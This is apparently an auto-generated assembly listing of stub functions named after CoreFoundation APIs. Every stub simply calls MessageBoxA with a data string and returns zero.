mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetCreateWithCharactersInString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetFast
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetGetPredefined
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetHasMemberInPlane
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetInitInlineBuffer
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetIntersect
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetInvert
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetIsCharacterMember
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetIsLongCharacterMember
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetIsSupersetOfSet
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetIsSurrogatePairMember
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetRemoveCharactersInRange
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetRemoveCharactersInString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCharacterSetUnion
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCopyDescription
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCopyHomeDirectoryURLForUser
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCopySearchPathForDirectoriesInDomains
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCopySystemVersionString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCopyTypeIDDescription
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFCopyUserName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataAppendBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataCreateWithBytesNoCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataDeleteBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataFind
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataGetBytePtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataGetBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataGetLength
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataGetMutableBytePtr
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataIncreaseLength
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataReplaceBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDataSetLength
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateCompare
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterCopyProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterCreateDateFormatFromTemplate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterCreateDateFormatsFromTemplates
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterCreateDateFromString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterCreateStringWithAbsoluteTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterCreateStringWithDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterGetAbsoluteTimeFromString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterGetDateStyle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterGetFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterGetLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterGetTimeStyle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterSetFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateFormatterSetProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateGetAbsoluteTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateGetTimeIntervalSinceDate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDateGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryAddValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryApplyFunction
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryContainsKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryContainsValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryCreateMutable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryCreateMutableCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetCountOfKey
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetCountOfValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetKeyIfPresent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetKeysAndValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryGetValueIfPresent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryRemoveAllValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryRemoveValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionaryReplaceValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFDictionarySetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFEqual
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorCopyDescription
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorCopyFailureReason
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorCopyRecoverySuggestion
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorCopyUserInfo
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorCreateWithUserInfoKeysAndValues
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorGetCallBackForDomain
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorGetCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorGetDomain
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFErrorSetCallBackForDomain
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFGetAllocator
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFGetRetainCount
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFGetSystemUptime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFGetUserName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFGregorianDateGetAbsoluteTime
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFGregorianDateIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFHash
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFHashBytes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyAvailableLocaleIdentifiers
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyCommonISOCurrencyCodes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyCurrent
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyDisplayNameForPropertyValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyISOCountryCodes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyISOCurrencyCodes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyISOLanguageCodes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCopyPreferredLanguages
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreateCanonicalLanguageIdentifierFromString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreateCanonicalLocaleIdentifierFromScriptManagerCodes
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreateCanonicalLocaleIdentifierFromString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreateComponentsFromLocaleIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreateCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreateLocaleIdentifierFromComponents
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleCreateLocaleIdentifierFromWindowsLocaleCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetLanguageCharacterDirection
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetLanguageLineDirection
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetLanguageRegionEncodingForLocaleIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetSystem
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLocaleGetWindowsLocaleCodeFromLocaleIdentifier
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFLog
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMakeCollectable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMergeSortArray
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortCreateLocal
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortCreateRemote
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortCreateRunLoopSource
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortCreateUber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortGetContext
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortGetInvalidationCallBack
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortGetName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortInvalidate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortIsRemote
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortIsValid
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortSendRequest
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortSetCloneCallout
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortSetInvalidationCallBack
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMessagePortSetName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMutableAttributedStringOpenUText
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFMutableStringOpenUText
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterAddObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterGetDarwinNotifyCenter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterGetDistributedCenter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterGetLocalCenter
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterPostNotification
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterPostNotificationWithOptions
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterRemoveEveryObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNotificationCenterRemoveObserver
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNullGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberCompare
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterCopyProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterCreateNumberFromString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterCreateStringWithNumber
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterCreateStringWithValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterGetDecimalInfoForCurrencyCode
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterGetFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterGetLocale
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterGetStyle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterGetValueFromString
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterSetFormat
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberFormatterSetProperty
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberGetByteSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberGetType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberGetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFNumberIsFloatType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInAddInstanceForFactory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInFindFactoriesForPlugInType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInFindFactoriesForPlugInTypeInPlugIn
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInGetBundle
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInInstanceCreate
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInInstanceCreateWithInstanceDataSize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInInstanceGetFactoryName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInInstanceGetInstanceData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInInstanceGetInterfaceFunctionTable
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInInstanceGetTypeID
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInIsLoadOnDemand
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInRegisterFactoryFunction
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInRegisterFactoryFunctionByName
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInRegisterPlugInType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInRemoveInstanceForFactory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInSetLoadOnDemand
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInUnregisterFactory
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPlugInUnregisterPlugInType
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesAddSuitePreferencesToApp
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesAppSynchronize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesAppValueIsForced
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesCopyAppValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesCopyApplicationList
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesCopyKeyList
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesCopyMultiple
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesCopyValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesFlushCaches
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesGetAppBooleanValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesGetAppIntegerValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesRemoveSuitePreferencesFromApp
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesSetAppValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesSetMultiple
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesSetValue
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPreferencesSynchronize
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListCreateData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListCreateDeepCopy
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListCreateFromStream
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
CFPropertyListCreateFromXMLData
push 0x0
mov eax r--data
push eax
push eax
push 0x0
call [ MessageBoxA@IAT ]
xor eax eax
retn
